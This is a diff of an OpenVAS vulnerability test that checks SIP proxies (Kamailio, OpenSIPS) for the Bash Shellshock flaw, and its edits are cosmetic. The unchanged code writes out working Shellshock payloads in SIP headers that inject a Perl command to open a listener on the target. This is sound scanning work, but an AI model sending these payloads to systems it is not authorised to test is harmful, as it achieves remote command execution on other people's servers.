@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_sip_remote_cmd_exec_vuln.nasl 9438 2018-04-11 10:28:36Z cfischer $
+# $Id: gb_bash_shellshock_sip_remote_cmd_exec_vuln.nasl 10317 2018-06-25 14:09:46Z cfischer $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (SIP Check)
 #
@@ -27,14 +27,14 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105093");
-  script_version("$Revision: 9438 $");
+  script_version("$Revision: 10317 $");
   script_cve_id("CVE-2014-6271","CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-11 12:28:36 +0200 (Wed, 11 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-25 16:09:46 +0200 (Mon, 25 Jun 2018) $");
   script_tag(name:"creation_date", value:"2014-09-29 11:47:16 +0530 (Mon, 29 Sep 2014)");
-  script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (SIP Check)");
+  script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability(SIP Check)");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("General");
@@ -50,14 +50,14 @@ if(description)
   script_tag(name:"summary", value:"This host is installed with GNU Bash Shell
   and is prone to remote command execution vulnerability.");
 
-  script_tag(name:"vuldetect" , value:"Send a crafted command via SIP INVITE
+  script_tag(name:"vuldetect", value:"Send a crafted command via SIP INVITE
   request and check remote command execution.");
 
   script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered
   when evaluating environment variables passed from another environment.
   After processing a function definition, bash continues to process trailing strings.
 
-  The exec module in Kamailio, Opensips and propably every other SER fork passes the received
+  The exec module in Kamailio, Opensips and probably every other SER fork passes the received
   SIP headers as environment variables to the invoking shell. A proxy is vulnerable using any
   of the exec functions and has the 'setvars' parameter set to the default value '1'.");
 
@@ -85,17 +85,19 @@ infos = get_sip_port_proto( default_port:"5060", default_proto:"udp" );
 port = infos['port'];
 proto = infos['proto'];
 
+host = get_host_name();
+
 soc = open_sip_socket( port:port, proto:proto );
 if( ! soc ) exit( 0 );
 
 nc_port = rand() % 64512 + 1024;
 rand = 'OpenVAS-' + rand_str( length:28 );
 
-perl = 'perl -MIO::Socket -e \'my $l = new IO::Socket::INET(LocalPort => "' + nc_port  + 
+perl = 'perl -MIO::Socket -e \'my $l = new IO::Socket::INET(LocalPort => "' + nc_port  +
        '", Proto =>"tcp", Listen => 1, Reuse => 1) or die;  local $SIG{ALRM} =' +
        ' sub { die; }; alarm 10; if(my $s = $l->accept()) { print $s "' + rand + '"; exit; }\'';
 
-sip = 'v=0\r\n' + 
+sip = 'v=0\r\n' +
       'o=- 20800 20800 IN IP4 ' + get_host_ip()  + '\r\n' +
       's=SDP data\r\n' +
       'c=IN IP4 ' + get_host_ip()  + '\r\n' +
@@ -108,21 +110,21 @@ sip = 'v=0\r\n' +
       'a=ptime:20' +
       'a=sendrecv\r\n\r\n';
 
-req = 'INVITE sip:0987654321@' + get_host_name() + ' SIP/2.0\r\n' + 
-      'Via: SIP/2.0/' + toupper( proto ) + ' ' + this_host() + ':' + port + ';branch=z9hG4bK724588683\r\n' + 
+req = 'INVITE sip:0987654321@' + host + ' SIP/2.0\r\n' +
+      'Via: SIP/2.0/' + toupper( proto ) + ' ' + this_host() + ':' + port + ';branch=z9hG4bK724588683\r\n' +
       'From: "OpenVAS" <sip:0123456789@' + this_host() + '>;tag=784218059\r\n' +
-      'To: <sip:0987654321@' + get_host_name() + ':' + port + '>\r\n' + 
-      'Call-ID: ' + rand() + '\r\n' + 
-      'CSeq: 1 INVITE\r\n' + 
-      'Contact: <sip:0123456789@' + get_host_name() + ':' + port + '>\r\n' + 
-      'Content-Type: application/sdp\r\n' + 
+      'To: <sip:0987654321@' + host + ':' + port + '>\r\n' +
+      'Call-ID: ' + rand() + '\r\n' +
+      'CSeq: 1 INVITE\r\n' +
+      'Contact: <sip:0123456789@' + host + ':' + port + '>\r\n' +
+      'Content-Type: application/sdp\r\n' +
       'Allow: INVITE, INFO, PRACK, ACK, BYE, CANCEL, OPTIONS, NOTIFY, REGISTER, SUBSCRIBE, REFER, PUBLISH, UPDATE, MESSAGE\r\n' +
-      'Max-Forwards: 70\r\n' + 
-      'User-Agent: OpenVAS-' + OPENVAS_VERSION + '\r\n' + 
+      'Max-Forwards: 70\r\n' +
+      'User-Agent: OpenVAS-' + OPENVAS_VERSION + '\r\n' +
       'X-Ploit: () { OpenVAS:; }; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '\r\n' +
       'X-Ploit1: () { _; } >_[$($())] { PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '; }\r\n' +
       'Supported: replaces\r\n' +
-      'Expires: 360\r\n' + 
+      'Expires: 360\r\n' +
       'Allow-Events: talk,hold,conference,refer,check-sync\r\n' +
       'Content-Length: ' + strlen( sip ) + '\r\n\r\n' +
       sip;
